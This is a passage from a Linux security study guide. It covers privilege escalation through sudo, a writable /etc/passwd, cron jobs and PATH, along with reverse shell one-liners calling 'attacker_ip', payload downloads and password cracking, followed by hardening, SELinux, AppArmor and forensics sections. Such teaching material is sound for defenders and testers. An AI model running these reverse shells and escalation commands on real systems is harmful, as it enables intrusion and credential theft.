# Check GTFOBins for exploitation of known SUID binaries
# https://gtfobins.github.io/
```

**2. Sudo Misconfigurations**

```bash
sudo -l

# If (ALL) NOPASSWD: /usr/bin/find
sudo find . -exec /bin/bash \;

# If (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/bash'

# If (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'
```

**3. Writable /etc/passwd**

```bash
ls -la /etc/passwd
# If writable, add a root user:
echo 'hacker::0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker
```

**4. Cron Jobs Running as Root**

```bash
cat /etc/crontab
ls /etc/cron.d/
# If a cron runs a writable script as root, inject a payload
echo 'chmod +s /bin/bash' >> /writable/script.sh
# After cron runs:
bash -p
```

**5. PATH Hijacking**

```bash
# If sudo preserves PATH or script uses relative paths
export PATH=/tmp:$PATH
echo '#!/bin/bash
/bin/bash -p' > /tmp/ls
chmod +x /tmp/ls
```

**6. Kernel Exploits**

```bash
uname -r
# Check against known CVEs (e.g. DirtyCOW, Dirty Pipe)
```

**7. Writable Service Files or Binaries**

```bash
find /etc/systemd/system/ -writable 2>/dev/null
find /usr/local/bin/ -writable 2>/dev/null
```

---

## 19. Common Attack Techniques

### Reverse Shells

A reverse shell has the victim connect back to the attacker.

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

# Netcat
nc -e /bin/bash attacker_ip 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc attacker_ip 4444 > /tmp/f

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker_ip",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Attacker listener
nc -lvp 4444
```

### Shell Stabilization

Raw netcat shells are unstable. Upgrade to a full TTY:

```bash
# On victim (after getting shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Press Ctrl+Z to background
stty raw -echo; fg
# Press Enter twice
export TERM=xterm
```

### File Transfer Methods

```bash
# Wget / curl (if outbound HTTP allowed)
wget http://attacker_ip:8080/exploit
curl -O http://attacker_ip:8080/exploit

# Base64 encode/decode (no tools needed)
# On attacker:
base64 -w 0 exploit > exploit.b64
cat exploit.b64
# On victim:
echo "BASE64_STRING" | base64 -d > exploit
chmod +x exploit
```

### Password Cracking

```bash
# Unshadow passwd + shadow
unshadow /etc/passwd /etc/shadow > hashes.txt

# John the Ripper
john hashes.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john hashes.txt --format=sha512crypt --wordlist=rockyou.txt

# Hashcat
hashcat -m 1800 hashes.txt rockyou.txt       # SHA-512 ($6$)
hashcat -m 500 hashes.txt rockyou.txt        # MD5 ($1$)
hashcat -m 0 md5_hashes.txt rockyou.txt      # raw MD5
```

---

## 20. Linux Security Features

### SELinux

Security-Enhanced Linux uses mandatory access controls (MAC) based on policies.

```bash
# Check SELinux status
getenforce
sestatus

# Modes
# Enforcing  - policy is enforced; violations denied and logged
# Permissive - violations logged but not denied
# Disabled   - SELinux off

# Temporarily set permissive (until reboot)
setenforce 0
setenforce 1

# Persistent config
/etc/selinux/config
# SELINUX=enforcing | permissive | disabled

# Check file context
ls -Z /etc/passwd
ps -eZ | grep nginx

# Audit SELinux denials
grep "avc: denied" /var/log/audit/audit.log
audit2why < /var/log/audit/audit.log
```

### AppArmor

Profile-based MAC; common on Ubuntu/Debian.

```bash
# Status
aa-status
systemctl status apparmor

# Modes per profile
# enforce  - violations denied and logged
# complain - violations logged only

# Set profile to complain mode
aa-complain /usr/sbin/nginx

# Set to enforce
aa-enforce /usr/sbin/nginx

# Profiles location
ls /etc/apparmor.d/

# Check for denials
grep "DENIED" /var/log/syslog
grep "apparmor" /var/log/audit/audit.log
```

### PAM (Pluggable Authentication Modules)

PAM controls authentication behavior — password policies, login restrictions, MFA.

```
/etc/pam.d/common-auth        # Authentication stack
/etc/pam.d/common-password    # Password requirements
/etc/pam.d/sshd               # SSH-specific PAM config
/etc/security/limits.conf     # Resource limits
/etc/security/access.conf     # Login access control
```

```bash
# Password complexity (install libpam-pwquality)
# /etc/security/pwquality.conf
minlen = 14
dcredit = -1     # at least 1 digit
ucredit = -1     # at least 1 uppercase
lcredit = -1     # at least 1 lowercase
ocredit = -1     # at least 1 special character

# Account lockout
# /etc/pam.d/common-auth
auth required pam_faillock.so preauth audit deny=5 unlock_time=900
```

### Capabilities

Linux capabilities divide root privileges into discrete units. A process can have specific capabilities without full root.

```bash
# View capabilities on a binary
getcap /usr/bin/ping
capsh --print

# Set capability
setcap cap_net_raw+ep /usr/bin/ping

# Remove capability
setcap -r /usr/bin/ping

# Find all binaries with capabilities (privesc interest)
getcap -r / 2>/dev/null
```

Common capabilities of interest for privilege escalation:

| Capability | Risk |
|-----------|------|
| `cap_setuid` | Can set any UID (root escalation) |
| `cap_setgid` | Can set any GID |
| `cap_net_raw` | Raw network access |
| `cap_dac_override` | Bypass file permission checks |
| `cap_sys_admin` | Broad system administration |
| `cap_sys_ptrace` | Trace any process (credential theft) |

---

## 21. Defense & Hardening

### Hardening Checklist

```bash
# 1. Keep system updated
apt update && apt upgrade -y

# 2. Remove unnecessary packages
apt autoremove

# 3. Disable unused services
systemctl disable bluetooth
systemctl disable cups        # printing
systemctl disable avahi-daemon  # zeroconf

# 4. Secure SSH
nano /etc/ssh/sshd_config
# PermitRootLogin no
# PasswordAuthentication no
# MaxAuthTries 3

# 5. Configure firewall
ufw default deny incoming
ufw allow ssh
ufw enable

# 6. Configure fail2ban (brute-force protection)
apt install fail2ban
cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
systemctl enable fail2ban

# 7. Set umask
echo 'umask 027' >> /etc/profile

# 8. Restrict cron to root
chmod 700 /etc/cron.d /etc/cron.daily /etc/cron.weekly /etc/cron.monthly
chmod 600 /etc/crontab

# 9. Audit SUID/SGID binaries
find / -perm -4000 -o -perm -2000 2>/dev/null

# 10. Enable auditd
apt install auditd
systemctl enable auditd
```

### Kernel Hardening (sysctl)

```bash
# View current settings
sysctl -a | grep net.ipv4

# Apply temporarily
sysctl -w net.ipv4.ip_forward=0

# Persistent (/etc/sysctl.conf or /etc/sysctl.d/)
net.ipv4.ip_forward = 0               # Disable IP forwarding
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.tcp_syncookies = 1           # SYN flood protection
net.ipv4.icmp_echo_ignore_broadcasts = 1
kernel.randomize_va_space = 2         # ASLR full randomization
kernel.dmesg_restrict = 1             # Restrict dmesg to root
kernel.kptr_restrict = 2              # Hide kernel pointers
fs.suid_dumpable = 0                  # No core dumps from SUID
```

### Fail2ban

```ini
# /etc/fail2ban/jail.local
[sshd]
enabled = true
port    = ssh
filter  = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime  = 3600
findtime = 600
```

```bash
# Check status
fail2ban-client status
fail2ban-client status sshd

# Unban an IP
fail2ban-client set sshd unbanip 192.168.1.100
```

---

## 22. Forensics & Incident Response

### Volatile Data Collection

```bash
# System date/time
date; uptime

# Running processes
ps auxf > /tmp/ir/processes.txt
ls -la /proc/*/exe 2>/dev/null > /tmp/ir/proc_executables.txt

# Network connections
ss -tunap > /tmp/ir/connections.txt
ip neigh > /tmp/ir/arp.txt
ip route > /tmp/ir/routes.txt

# Logged-in users
who > /tmp/ir/who.txt
w > /tmp/ir/w.txt
last > /tmp/ir/last.txt
lastb > /tmp/ir/lastb.txt

# Open files
lsof > /tmp/ir/lsof.txt
lsof -i > /tmp/ir/lsof_network.txt

# Environment
env > /tmp/ir/env.txt

# Crontabs
crontab -l > /tmp/ir/user_crontab.txt
cat /etc/crontab > /tmp/ir/etc_crontab.txt
ls -la /etc/cron.d/ >> /tmp/ir/etc_crontab.txt

# Listening services
ss -tlnp > /tmp/ir/listening.txt

# Loaded kernel modules
lsmod > /tmp/ir/modules.txt
```

### Key Forensic Artifacts

| Artifact | Location | What It Shows |
|----------|----------|--------------|
| **Auth log** | `/var/log/auth.log` | SSH, sudo, su events |
| **Syslog** | `/var/log/syslog` | General system events |
| **Bash history** | `~/.bash_history` | Commands run by user |
| **Crontabs** | `/var/spool/cron/` | Scheduled tasks per user |
| **systemd units** | `/etc/systemd/system/` | Potentially malicious services |
| **wtmp / btmp** | `/var/log/wtmp`, `/var/log/btmp` | Login/logout history |
| **lastlog** | `/var/log/lastlog` | Last login per user |
| **Audit log** | `/var/log/audit/audit.log` | Syscalls, file access (if auditd running) |
| **/proc/\<PID\>** | In memory | Process details, open files, maps |
| **Recently modified** | `find` with `-mtime` | Files changed recently |
| **Deleted open files** | `/proc/<PID>/fd/` | Deleted files still in use by processes |

### Investigating a Suspicious Process

```bash
# Identify PID
ps aux | grep suspicious
pgrep suspicious_name

# Executable path (even if deleted)
ls -la /proc/<PID>/exe

# Command line
cat /proc/<PID>/cmdline | tr '\0' ' '

# Open files and network connections
lsof -p <PID>

# Environment variables
cat /proc/<PID>/environ | tr '\0' '\n'

# Memory maps
cat /proc/<PID>/maps

# Parent process
cat /proc/<PID>/status | grep PPid

# All threads
ls /proc/<PID>/task/
```

### Finding Indicators of Compromise

```bash
# Recently modified files
find / -mtime -1 -type f 2>/dev/null | grep -Ev "^/(proc|sys|run)"

# Recently modified config files
find /etc -mtime -7 -type f 2>/dev/null

# New SUID binaries
find / -perm -4000 -newer /tmp/baseline 2>/dev/null

# New systemd services
find /etc/systemd/system/ -newer /etc/passwd

# Unusual cron entries
diff <(crontab -l) <(cat /tmp/known_good_crontab)

# Users with UID 0
awk -F: '$3 == 0 {print $1}' /etc/passwd

# Users with no password
awk -F: '$2 == "" {print $1}' /etc/shadow

# Unusual SSH authorized_keys
find /home -name "authorized_keys" 2>/dev/null -exec cat {} \;
cat /root/.ssh/authorized_keys 2>/dev/null

# Hidden files in unusual places
find / -name ".*" -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | grep -v "^/home"
find /tmp /var/tmp /dev/shm -type f 2>/dev/null

# Binaries in /tmp (highly suspicious)
find /tmp /var/tmp -type f -executable 2>/dev/null

# Check for rootkits
rkhunter --check
chkrootkit
```

### Memory Forensics

```bash
# Capture memory (requires LiME kernel module or similar)
# With LiME:
insmod lime.ko "path=/tmp/memory.lime format=lime"

# Analyze with Volatility 3
python vol.py -f memory.lime -p profiles/ linux.pslist
python vol.py -f memory.lime linux.netstat
python vol.py -f memory.lime linux.bash     # bash history from memory
python vol.py -f memory.lime linux.malfind  # injected code
```

---

## Quick Reference: Essential Commands

### Navigation & Files
```bash
pwd; ls -la; cd; find; locate; which; whereis; file; stat
```

### Permissions
```bash
chmod; chown; chgrp; umask; getfacl; setfacl; getcap; setcap
```

### Users
```bash
whoami; id; groups; who; w; last; su; sudo; useradd; usermod; passwd
```

### Processes
```bash
ps aux; top; htop; kill; pkill; pgrep; nice; nohup; jobs; fg; bg
```

### Networking
```bash
ip addr; ss -tuln; netstat; ping; dig; nc; ssh; curl; wget; traceroute
```

### Logs
```bash
tail -f; grep; journalctl; last; lastb; ausearch; aureport
```

### Security
```bash
find / -perm -4000; sudo -l; getcap -r /; lsof; ss -tunap; auditctl
```

---

## Further Reading

- [GTFOBins](https://gtfobins.github.io/) — Exploiting Linux binaries for privesc
- [HackTricks – Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
- [Linux Audit Documentation](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing)
- [MITRE ATT&CK – Linux](https://attack.mitre.org/matrices/enterprise/linux/)
- [CIS Linux Benchmarks](https://www.cisecurity.org/benchmark/distribution_independent_linux)
- [The Linux Command Line (book)](https://linuxcommand.org/tlcl.php)
- [Explainshell](https://explainshell.com/) — Break down shell commands